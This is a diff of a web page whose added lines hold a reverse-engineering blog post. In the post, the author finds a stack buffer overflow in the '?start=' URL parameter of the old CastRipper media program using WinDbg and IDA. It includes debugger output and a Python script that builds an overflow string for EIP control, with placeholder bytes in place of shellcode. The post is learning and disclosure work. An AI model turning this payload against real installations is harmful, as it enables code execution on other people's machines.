@@ -13,13 +13,12 @@
   data-default-appearance="dark"
   data-auto-appearance="true"
 ><head>
-	<meta name="generator" content="Hugo 0.121.2">
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta name="theme-color" content="#FFFFFF" />
   
-  <title></title>
-    <meta name="title" content="" />
+  <title>Reverse Engineering CastRipper v2.9.6 &middot; </title>
+    <meta name="title" content="Reverse Engineering CastRipper v2.9.6 &middot; " />
   
   
   
@@ -76,16 +75,14 @@
     name="description"
     content="
       
-        
+        I am continuing my study and taking a chance to practice more my reverse engineering skills and exploit development I found the available vulnerable application at Exploit-DB - CastRipper to explore.
       
     "
   />
   
   
   
-  <link rel="canonical" href="https://pentesthacks.ca/" />
-  <link rel="alternate" type="application/rss+xml" href="/index.xml" title="" />
-  <link rel="alternate" type="application/json" href="/index.json" title="" />
+  <link rel="canonical" href="https://pentesthacks.ca/posts/postsec/castripper_revereng01/" />
   
   
     <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
@@ -100,30 +97,43 @@
   
   
   
-  <meta property="og:title" content="" />
-<meta property="og:description" content="" />
-<meta property="og:type" content="website" />
-<meta property="og:url" content="https://pentesthacks.ca/" />
+  <meta property="og:title" content="Reverse Engineering CastRipper v2.9.6" />
+<meta property="og:description" content="I am continuing my study and taking a chance to practice more my reverse engineering skills and exploit development I found the available vulnerable application at Exploit-DB - CastRipper to explore." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://pentesthacks.ca/posts/postsec/castripper_revereng01/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-07-15T22:57:14-04:00" />
+<meta property="article:modified_time" content="2024-07-15T22:57:14-04:00" />
 
 
-  <meta name="twitter:card" content="summary"/><meta name="twitter:title" content=""/>
-<meta name="twitter:description" content=""/>
+  <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Reverse Engineering CastRipper v2.9.6"/>
+<meta name="twitter:description" content="I am continuing my study and taking a chance to practice more my reverse engineering skills and exploit development I found the available vulnerable application at Exploit-DB - CastRipper to explore."/>
 
   
   <script type="application/ld+json">
   {
     "@context": "https://schema.org",
-    "@type": "WebSite",
-    "@id": "https:\/\/pentesthacks.ca\/",
-    "name": "",
+    "@type": "Article",
+    "articleSection": "Posts",
+    "name": "Reverse Engineering CastRipper v2.9.6",
+    "headline": "Reverse Engineering CastRipper v2.9.6",
     
+    "abstract": "I am continuing my study and taking a chance to practice more my reverse engineering skills and exploit development I found the available vulnerable application at Exploit-DB - CastRipper to explore.",
     "inLanguage": "en",
-    "url": "https:\/\/pentesthacks.ca\/",
-    
-    "publisher" : {
+    "url" : "https:\/\/pentesthacks.ca\/posts\/postsec\/castripper_revereng01\/",
+    "author" : {
       "@type": "Person",
       "name": "mzdaemon"
-    }
+    },
+    "copyrightYear": "2024",
+    "dateCreated": "2024-07-15T22:57:14-04:00",
+    "datePublished": "2024-07-15T22:57:14-04:00",
+    
+    "dateModified": "2024-07-15T22:57:14-04:00",
+    
+    "keywords": ["ExploitDev","ReverseEng"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "1057"
   }
   </script>
 
@@ -573,35 +583,22 @@ if (!doNotTrack) {
     <div class="relative flex grow flex-col">
       <main id="main-content" class="grow">
         
-  
-  
-    <article class="prose max-w-full dark:prose-invert">
-  
-  <section></section>
-</article>
-<section>
-  
-  <h2 class="mt-8 text-2xl font-extrabold">Recent</h2>
-  
-    <article class="mt-6 flex max-w-prose flex-row">
-  <div>
-    <h3 class="flex items-center text-xl font-semibold">
+  <article>
+    <header class="max-w-prose">
       
-        <a
-          class="text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
-          href="/posts/postsec/narly_windbg/"
-          >Narly plugin for windbg</a
-        >
+      <h1 class="mb-8 mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        Reverse Engineering CastRipper v2.9.6
+      </h1>
       
-      
-      
-    </h3>
-    <div class="text-sm text-neutral-500 dark:text-neutral-400">
-      
+        <div class="mb-10 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+          
 
 
 
 
+
+  
+  
 
 
 
@@ -626,7 +623,7 @@ if (!doNotTrack) {
   <div class="flex flex-row flex-wrap items-center">
     
     
-      <time datetime="2024-03-09 21:13:16 -0500 EST">9 March 2024</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">1 min</span>
+      <time datetime="2024-07-15 22:57:14 -0400 EDT">15 July 2024</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">5 mins</span>
     
 
     
@@ -653,96 +650,6 @@ if (!doNotTrack) {
               href="/tags/exploitdev/"
               class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
               >ExploitDev</a
-            >
-          
-            <a
-              href="/tags/debugger/"
-              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
-              >debugger</a
-            >
-          
-        
-      
-    </div>
-  
-
-
-    </div>
-    
-  </div>
-</article>
-
-  
-    <article class="mt-6 flex max-w-prose flex-row">
-  <div>
-    <h3 class="flex items-center text-xl font-semibold">
-      
-        <a
-          class="text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
-          href="/posts/postsec/iat_win/"
-          >The IAT (Import Address Table)</a
-        >
-      
-      
-      
-    </h3>
-    <div class="text-sm text-neutral-500 dark:text-neutral-400">
-      
-
-
-
-
-
-
-
-  
-
-  
-  
-    
-  
-
-  
-
-  
-
-  
-    
-  
-
-  
-
-
-  <div class="flex flex-row flex-wrap items-center">
-    
-    
-      <time datetime="2024-03-09 20:34:17 -0500 EST">9 March 2024</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">1 min</span>
-    
-
-    
-    
-  </div>
-
-  
-  
-    <div class="my-1 flex flex-wrap text-xs leading-relaxed text-neutral-500 dark:text-neutral-400">
-      
-        
-          
-            <a
-              href="/categories/offensivesecurity/"
-              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
-              >OffensiveSecurity</a
-            >
-          
-        
-      
-        
-          
-            <a
-              href="/tags/windowsinternal/"
-              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
-              >WindowsInternal</a
             >
           
             <a
@@ -751,306 +658,323 @@ if (!doNotTrack) {
               >ReverseEng</a
             >
           
-            <a
-              href="/tags/exploitdev/"
-              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
-              >ExploitDev</a
-            >
-          
         
       
     </div>
   
 
 
-    </div>
-    
+        </div>
+      
+      
+    </header>
+    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
+      
+        <div class="order-first px-0 lg:order-last lg:max-w-xs lg:ps-8">
+          <div class="toc pe-5 lg:sticky lg:top-10 print:hidden">
+            <details open class="-ms-5 mt-0 overflow-hidden rounded-lg ps-5">
+  <summary
+    class="block cursor-pointer bg-neutral-100 py-1 ps-5 text-lg font-semibold text-neutral-800 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden"
+  >
+    Table of Contents
+  </summary>
+  <div class="border-s border-dotted border-neutral-300 py-2 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#installed-the-software">Installed the software</a></li>
+            <li><a href="#software-enumeration">Software Enumeration</a></li>
+          </ul>
+        </li>
+        <li><a href="#reverse-engineering">Reverse Engineering</a>
+          <ul>
+            <li><a href="#attaching-to-windbg-for-dynamic-analysis">Attaching to windbg for dynamic analysis</a></li>
+            <li><a href="#loaded-crfilter01dll-library-into-ida-free">Loaded CRfilter01.dll library into IDA Free</a></li>
+            <li><a href="#strings-view-in-ida">Strings view in IDA</a></li>
+            <li><a href="#finding-the-vulnerable-function">Finding the vulnerable function</a></li>
+            <li><a href="#how-to-trigger-the-buffer-overflow-">How to trigger the Buffer Overflow ?</a></li>
+            <li><a href="#checking-on-windbg--controlling-eip-register">Checking on Windbg &amp; Controlling EIP Register</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
   </div>
-</article>
+</details>
 
-  
-    <article class="mt-6 flex max-w-prose flex-row">
-  <div>
-    <h3 class="flex items-center text-xl font-semibold">
+          </div>
+        </div>
+      
+      <div class="min-h-0 min-w-0 max-w-prose grow">
+        <p>I am continuing my study and taking a chance to practice more my reverse engineering skills and exploit development I found the available vulnerable application at <a href="https://www.exploit-db.com/exploits/13768" target="_blank" rel="noreferrer">Exploit-DB - CastRipper</a> to explore.</p>
+<p>My idea was to download the vulnerable application and install on my own lab and reverse engineering to find the buffer overflow vulnerability without looking or following the exploit-db available proof of concept and I was able to find a vulnerablity. I don&rsquo;t see it published anywhere such as exploit-db or packetstorm, I only see vulnerabilities for CastRipper reported utilizing files like aspx,m3u or pls, but not the vulnerable ?start= parameter I discovered.</p>
+<p>Disclaimer.: The official website (<a href="http://www.mini-stream.net/castripper/" target="_blank" rel="noreferrer">http://www.mini-stream.net/castripper/</a>) is no longer available and company&rsquo;s contact as well not available, I guess they probably discontinued the software.</p>
+<h4 id="installed-the-software" class="relative group">Installed the software <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#installed-the-software" aria-label="Anchor">#</a></span></h4><p>You can download the software via exploit-db if you want to follow along <a href="https://www.exploit-db.com/apps/38494a208b81181c5c832df64384dc13-CastRipper.exe" target="_blank" rel="noreferrer">Vulnerable App CastRipper</a>. The installation is very simple, after installing you can open and you should be presented with the application as showing below</p>
+<figure><img src="/image/CastRipper-Installed.png" width="400" height="400">
+</figure>
+<h4 id="software-enumeration" class="relative group">Software Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#software-enumeration" aria-label="Anchor">#</a></span></h4><p>One of important aspect of reverse engineering is the ability to enumerate the software to find all valid points for data input.
+We can play with the sofware and also look for available documentation. Unfortunately the oficial website is not available because the software is very old.</p>
+<p>After looking the installation directory, we can see an interesting text file called crcmd.txt and this file contains Examples on how to use the software through command line</br></p>
+<pre tabindex="0"><code>C:\Program Files\Mini-stream\CastRipper\crcmd.txt
+</code></pre><figure><img src="/image/castripper_default_install_dir.png" width="900" height="600">
+</figure>
+<p>Through out the example we see that accepts an url and the GUI also has the load button where we can input data.
+What are the url format ? another way of understanding better the software is to decompile and look at strings and functions that the software uses.</p>
+<h3 id="reverse-engineering" class="relative group">Reverse Engineering <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#reverse-engineering" aria-label="Anchor">#</a></span></h3><h4 id="attaching-to-windbg-for-dynamic-analysis" class="relative group">Attaching to windbg for dynamic analysis <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#attaching-to-windbg-for-dynamic-analysis" aria-label="Anchor">#</a></span></h4><p>We need to understand what happen when we feed data and which part of the binary will process our data.
+I opened CastRipper and I attached to windbg and setup a breakpoint to WS2_32!recv function since we will provide http url as an input.</p>
+<p>windbg:</p>
+<pre tabindex="0"><code>bp WS2_32!recv 
+</code></pre><p>I created a dummy file on Kali:</p>
+<pre tabindex="0"><code>touch /var/www/html/test.txt
+/var/www/html/test.txt
+</code></pre><figure><img src="/image/CastRipper-Windbg-BreakPoint.png" width="900" height="600">
+</figure>
+<p>Below we see that we sucessfully hit the breakpoint</p>
+<pre tabindex="0"><code>0:009&gt; bp WS2_32!recv 
+0:009&gt; bl
+     0 e Disable Clear  76e523a0     0001 (0001)  0:**** WS2_32!recv
+0:009&gt; g
+ModLoad: 74b80000 74bd6000   C:\Windows\system32\mswsock.dll
+Breakpoint 0 hit
+*** WARNING: Unable to verify checksum for C:\Program Files\Mini-stream\CastRipper\CRfilter03.dll
+eax=0530e6d8 ebx=00000434 ecx=00000000 edx=02580930 esi=02581e00 edi=02580930
+eip=76e523a0 esp=0530e6b0 ebp=76e523a0 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+WS2_32!recv:
+76e523a0 8bff            mov     edi,edi
+</code></pre><p>We can set a read hardware breakpoint to the memory address that will receive our payload to check where is used</p>
+<pre tabindex="0"><code>0:007&gt; dd esp l5
+0530e6b0  10016354 00000434 0530e6d8 00000800
+0530e6c0  00000000
+0:007&gt; ba r1 0530e6d8
+</code></pre><p>We can see that is been used in CRFilter03.dll by a rep movs mneumonic which means is copying our data to a different memory address</p>
+<pre tabindex="0"><code>0:007&gt; g
+Breakpoint 1 hit
+eax=02586e98 ebx=02580930 ecx=0000003c edx=000000f5 esi=0530e6dc edi=02586e9c
+eip=10010f4d esp=0530e6a4 ebp=000000f5 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
+CRfilter03!Filter_RegGetVADInfo+0x553d:
+10010f4d f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
+</code></pre><p>After stepping through the code I saw the execution is transferred to another module CRfilter01.dll and this module parses the input url.</p>
+<h4 id="loaded-crfilter01dll-library-into-ida-free" class="relative group">Loaded CRfilter01.dll library into IDA Free <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#loaded-crfilter01dll-library-into-ida-free" aria-label="Anchor">#</a></span></h4><p>I copied the application binary C:\Program Files\Mini-stream\CastRipper\Crfilter01.dll to kali linux where i have IDA free installed and loaded into IDA for furhter analysis to understand better the software.</p>
+<h4 id="strings-view-in-ida" class="relative group">Strings view in IDA <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#strings-view-in-ida" aria-label="Anchor">#</a></span></h4><p>Useful approach during reverse engineering to understand the software is to look at the strings, you click on Views -&gt; Open subviews -&gt; Strings.</p>
+<figure><img src="/image/CastRipper-CRFilter01_module_IDAFree.png" width="900" height="600">
+</figure>
+<p>We can learn a lot with the Strings tab in IDA, we can see with screenshot above the strings such as ?url, http:// or at the bottom .shtml indicating accepted file format.</p>
+<p>The .shtml string is very interesting and I used the cross-reference in IDA free to determine what part in the code that&rsquo;s using the string.
+You can click on the.phtml and select the aShtml in the .data section press the x keyboard key.</p>
+<p>We can also see in the screenshot others file formats available such as &lsquo;pls&rsquo;, &lsquo;wax&rsquo;, &lsquo;wvx&rsquo;, &lsquo;m3u&rsquo; etc.. to explore, but I focused on phtml.</p>
+<figure><img src="/image/CastRipper_aShtml.png" width="900" height="600">
+</figure>
+<p>Below we can see a function called sub_23EF220 compares our http url file extension against several formats such as .htm, .html,  .shtml, .rpm, .php, .asp, .cgi and etc..</p>
+<figure><img src="/image/castRipper_compare_httpfile_ext.png" width="900" height="600">
+</figure>
+<h4 id="finding-the-vulnerable-function" class="relative group">Finding the vulnerable function <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#finding-the-vulnerable-function" aria-label="Anchor">#</a></span></h4><p>I have picked the .phtml as file extension of my input http filename like http://10.0.2.26/test.phtml. I configured a breakpoint at memory address 0x023EF262 and stepped through the code.</p>
+<pre tabindex="0"><code>0:007&gt; bp 0x023EF262
+0:007&gt; g
+Breakpoint 6 hit
+eax=00000000 ebx=05329da0 ecx=02407e8c edx=fffe682e esi=05329da0 edi=05329d9c
+eip=023ef262 esp=0530f010 ebp=00000000 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+CRfilter01!Mpf_FileDownloadRegCurrentInfoCallBack+0x10f12:
+023ef262 68847e4002      push    offset CRfilter01!Mpf_FileDownloadRegCurrentInfoCallBack+0x29b34 (02407e84)
+0:007&gt; da 02407e84
+02407e84  &#34;.shtml&#34;
+</code></pre><p>After following the code on windbg and using IDA Free combined I found an interesting string that leads to an interesting path as showing on screenshot below.
+The ?start=, I attemped to send my input string adding the ?start= as part of my http request like http://10.0.2.26/test.phtml?start=XXXXX</p>
+<figure><img src="/image/CastRipper_interesting_string_StartParam.png" width="900" height="600">
+</figure>
+<p>Sending the input url string again with ?start= we lead to interesting path to an interesting call to _strncpy function as showing screenshot below. The code doesn&rsquo;t limit how much data or how long is the string you can provide to ?start= parameter which causes the buffer overflow vulnerability</p>
+<figure><img src="/image/CastRipper_Vulnerable_Strncpy.png" width="900" height="600">
+</figure>
+<h4 id="how-to-trigger-the-buffer-overflow-" class="relative group">How to trigger the Buffer Overflow ? <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#how-to-trigger-the-buffer-overflow-" aria-label="Anchor">#</a></span></h4><p>We just need to send a long enough data to the ?start= parameter and click on Load button and paste into the load field for the application and click on OK Button.
+As showing below an example,</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sploit</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">shellcode</span> <span class="o">=</span>  <span class="s2">&#34;D&#34;</span> <span class="o">*</span> <span class="mi">900</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">buf</span> <span class="o">=</span> <span class="s2">&#34;http://127.0.0.1/test.phtml?start=&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">buf</span> <span class="o">+=</span> <span class="s2">&#34;C&#34;</span><span class="o">*</span><span class="mi">8670</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">buf</span> <span class="o">+=</span> <span class="s2">&#34;</span><span class="se">\x42\x42\x42\x42</span><span class="s2">&#34;</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">buf</span> <span class="o">+=</span> <span class="n">shellcode</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sploit</span><span class="p">()</span>
+</span></span></code></pre></div><h4 id="checking-on-windbg--controlling-eip-register" class="relative group">Checking on Windbg &amp; Controlling EIP Register <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#checking-on-windbg--controlling-eip-register" aria-label="Anchor">#</a></span></h4><p>I opened CastRipper application and attached to windbg.
+I ran my script (the one above) and pasted into the CastRipper by clicking on Load and the paste on the load field and click OK Button.
+We successfully controlled EIP. Full POC can be found on my <a href="https://github.com/mzdaemon/P0CcastRipperBufferOverFlow" target="_blank" rel="noreferrer">github CastRipper</a></p>
+<p>I hope you enjoyed the jorney !!! see you soon.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python castRipper-test.py <span class="p">|</span> xclip -selection clipboard 
+</span></span></code></pre></div><figure><img src="/image/CastRipper-EIPControl.png" width="900" height="600">
+</figure>
+
+      </div>
+    </section>
+    <footer class="max-w-prose pt-8 print:hidden">
+      
+  <div class="flex">
+    
+    
+    
+    <div class="place-self-center">
+      
+        <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+          Author
+        </div>
+        <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+          mzdaemon
+        </div>
+      
+      
+        <div class="text-sm text-neutral-700 dark:text-neutral-400">Offensive Security, Penetration Tester, Red Teaming</div>
+      
+      <div class="text-2xl sm:text-lg">
+  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
+    
       
         <a
-          class="text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
-          href="/posts/postsec/rp_gadget/"
-          >The RP++ ROP Finder</a
+          class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
+          style="will-change:transform;"
+          href="https://github.com/mzdaemon"
+          target="_blank"
+          aria-label="Github"
+          rel="me noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<!-- Uploaded to: SVG Repo, www.svgrepo.com, Transformed by: SVG Repo Mixer Tools -->
+<svg width="800px" height="800px" viewBox="0 0 20.00 20.00" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" fill="#0a0a0a" stroke="#0a0a0a">
+<g id="SVGRepo_bgCarrier" stroke-width="0"/>
+<g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" stroke="#CCCCCC" stroke-width="0.12"/>
+<g id="SVGRepo_iconCarrier"> <title>github [#fdfcfc]</title> <desc>Created with Sketch.</desc> <defs> </defs> <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"> <g id="Dribbble-Light-Preview" transform="translate(-140.000000, -7559.000000)" fill="#fdfcfc"> <g id="icons" transform="translate(56.000000, 160.000000)"> <path d="M94,7399 C99.523,7399 104,7403.59 104,7409.253 C104,7413.782 101.138,7417.624 97.167,7418.981 C96.66,7419.082 96.48,7418.762 96.48,7418.489 C96.48,7418.151 96.492,7417.047 96.492,7415.675 C96.492,7414.719 96.172,7414.095 95.813,7413.777 C98.04,7413.523 100.38,7412.656 100.38,7408.718 C100.38,7407.598 99.992,7406.684 99.35,7405.966 C99.454,7405.707 99.797,7404.664 99.252,7403.252 C99.252,7403.252 98.414,7402.977 96.505,7404.303 C95.706,7404.076 94.85,7403.962 94,7403.958 C93.15,7403.962 92.295,7404.076 91.497,7404.303 C89.586,7402.977 88.746,7403.252 88.746,7403.252 C88.203,7404.664 88.546,7405.707 88.649,7405.966 C88.01,7406.684 87.619,7407.598 87.619,7408.718 C87.619,7412.646 89.954,7413.526 92.175,7413.785 C91.889,7414.041 91.63,7414.493 91.54,7415.156 C90.97,7415.418 89.522,7415.871 88.63,7414.304 C88.63,7414.304 88.101,7413.319 87.097,7413.247 C87.097,7413.247 86.122,7413.234 87.029,7413.87 C87.029,7413.87 87.684,7414.185 88.139,7415.37 C88.139,7415.37 88.726,7417.2 91.508,7416.58 C91.513,7417.437 91.522,7418.245 91.522,7418.489 C91.522,7418.76 91.338,7419.077 90.839,7418.982 C86.865,7417.627 84,7413.783 84,7409.253 C84,7403.59 88.478,7399 94,7399" id="github-[#fdfcfc]"> </path> </g> </g> </g> </g>
+</svg></span></a
         >
       
-      
-      
-    </h3>
-    <div class="text-sm text-neutral-500 dark:text-neutral-400">
-      
-
-
-
-
-
-
-
-  
-
-  
-  
     
-  
-
-  
-
-  
-
-  
-    
-  
-
-  
-
-
-  <div class="flex flex-row flex-wrap items-center">
-    
-    
-      <time datetime="2024-03-09 19:46:31 -0500 EST">9 March 2024</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">1 min</span>
-    
-
-    
-    
-  </div>
-
-  
-  
-    <div class="my-1 flex flex-wrap text-xs leading-relaxed text-neutral-500 dark:text-neutral-400">
-      
-        
-          
-            <a
-              href="/categories/offensivesecurity/"
-              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
-              >OffensiveSecurity</a
-            >
-          
-        
-      
-        
-          
-            <a
-              href="/tags/exploitdev/"
-              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
-              >ExploitDev</a
-            >
-          
-        
-      
-    </div>
-  
-
-
-    </div>
-    
-  </div>
-</article>
-
-  
-    <article class="mt-6 flex max-w-prose flex-row">
-  <div>
-    <h3 class="flex items-center text-xl font-semibold">
       
         <a
-          class="text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
-          href="/posts/postsec/teb_struct/"
-          >The TEB Structure</a
+          class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
+          style="will-change:transform;"
+          href="https://twitter.com/mzdaemon"
+          target="_blank"
+          aria-label="Twitter"
+          rel="me noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg>
+</span></a
         >
       
-      
-      
-    </h3>
-    <div class="text-sm text-neutral-500 dark:text-neutral-400">
-      
-
-
-
-
-
-
-
-  
-
-  
-  
-    
-  
-
-  
-
-  
-
-  
-    
-  
-
-  
-
-
-  <div class="flex flex-row flex-wrap items-center">
-    
-    
-      <time datetime="2024-03-09 16:49:54 -0500 EST">9 March 2024</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">1 min</span>
-    
-
-    
     
   </div>
 
-  
-  
-    <div class="my-1 flex flex-wrap text-xs leading-relaxed text-neutral-500 dark:text-neutral-400">
-      
-        
-          
-            <a
-              href="/categories/offensivesecurity/"
-              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
-              >OffensiveSecurity</a
-            >
-          
-        
-      
-        
-          
-            <a
-              href="/tags/windowsinternal/"
-              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
-              >WindowsInternal</a
-            >
-          
-            <a
-              href="/tags/reverseeng/"
-              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
-              >ReverseEng</a
-            >
-          
-            <a
-              href="/tags/exploitdev/"
-              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
-              >ExploitDev</a
-            >
-          
-        
-      
+</div>
     </div>
-  
-
-
-    </div>
-    
   </div>
-</article>
 
+
+      
   
-    <article class="mt-6 flex max-w-prose flex-row">
-  <div>
-    <h3 class="flex items-center text-xl font-semibold">
+  <section class="flex flex-row flex-wrap justify-center pt-4 text-xl">
+    
       
         <a
-          class="text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
-          href="/posts/postsec/peb/"
-          >The PEB Structure</a
+          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="https://twitter.com/intent/tweet/?url=https://pentesthacks.ca/posts/postsec/castripper_revereng01/&amp;text=Reverse%20Engineering%20CastRipper%20v2.9.6"
+          title="Tweet on Twitter"
+          aria-label="Tweet on Twitter"
+          target="_blank"
+          rel="noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg>
+</span></a
         >
       
+    
       
+        <a
+          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="https://reddit.com/submit/?url=https://pentesthacks.ca/posts/postsec/castripper_revereng01/&amp;resubmit=true&amp;title=Reverse%20Engineering%20CastRipper%20v2.9.6"
+          title="Submit to Reddit"
